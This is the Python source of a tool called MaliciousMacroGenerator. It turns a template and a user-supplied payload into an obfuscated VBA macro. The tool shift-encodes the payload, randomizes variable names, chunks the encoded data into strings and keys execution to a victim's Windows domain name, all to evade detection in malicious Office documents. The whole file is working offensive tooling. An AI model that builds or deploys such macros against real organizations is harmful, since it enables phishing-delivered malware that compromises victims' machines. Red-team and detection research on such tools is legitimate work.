import sys
import random
import string 
import os
import re

def gen_var(size):
	return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(size))

def gen_int(size):
	return ''.join(random.SystemRandom().choice(string.digits) for _ in range(size))

def encode_data(buffer, offset):
	data = ""
	for c in buffer:
		data += chr(ord(c) + int(sys.argv[3]))
	return data
	
def randomize_vars(buffer, vars):
	for var in vars:
		for i in reversed(range(1, 40)):
			buffer = buffer.replace(var + str(i), gen_var(random.randrange(5, 20)))
	return buffer

def randomize_int(buffer):
	for i in reversed(range(1, 40)):
		buffer = buffer.replace("[int" + str(i) +  "]", gen_int(random.randrange(3, 5)))
	return buffer

def encode_domain(buffer, domain, offset):
	domain = encode_data(domain, offset)
	buffer = buffer.replace("[DOMAIN]", domain)
	return buffer
	
def gen_chunk(buffer, payload, offset):
	payload = encode_data(payload, offset)
	vars = "Dim " + gen_var(random.randrange(5, 20)) + " As String\r\n"
	args = ""
	size = 0
	
	for item in re.findall("." * 200, payload):
		current_var = gen_var(random.randrange(5, 20))
		vars += "\tDim " + current_var + " As String\r\n"
		vars += "\t" + current_var + " = \"" + item + "\"\r\n" 
		
		args += current_var + " & "
		size += 200
		
	if len(payload) > size:
		current_var = gen_var(random.randrange(5, 20))
		vars += "\tDim " + current_var + " As String\r\n"
		vars += "\t" + current_var + " = \"" + payload[(len(payload) - size) * -1:] + "\"\r\n" 
		args += current_var
	else:
		args = args[:-3]

	return buffer.replace("[PAYLOAD]", vars).replace("[PAYLOAD_ARGS]", args)

def load_data(filename):
	if os.path.exists(filename):
		buffer = open(filename, "rb").read()
		return buffer
	else:
		print "[-] \"%s\"File not found." % filename
		exit(0)

def save_macro(filename, buffer):
	try:
		open(filename, "wb").write(buffer)
	except:
		print "[-] Failed to save \"%s\"" % filename
		exit(0)
	print "[*] Saving \"%s\" as the final macro" % filename
	
def banner():
	print "MaliciousMacroGenerator V1.0 - charles.hamilton@mandiant.com RingZer0 Team"
	
def help():
	print "Usage: %s [template] [domain] [offset] [payload] [output]\n\n\ttemplate\tTemplate macro\n\tdomain\t\tTarget domain name (USERDOMAIN env variable value)\n\toffset\t\tEncoding offset (default 3)\n\tpayload\t\tPayload to be executed\n\toutput\t\tOutput filename" % sys.argv[0]
		
if __name__ == "__main__":
	data = ""
	vars = ["var", "func", "data", "cond", "int"]
	offset = 0
	domain = ""
	
	banner()
	
	if len(sys.argv) < 6:
		help()
		exit(0)
	
	offset = int(sys.argv[3])
	domain = sys.argv[2]
	
	data = load_data(sys.argv[1])
	data = randomize_int(data)
	data = randomize_vars(data, vars)
	data = encode_domain(data, domain, offset)
	data = gen_chunk(data, sys.argv[4], offset)
	
	save_macro(sys.argv[5], data)
	
	print "[*] Completed"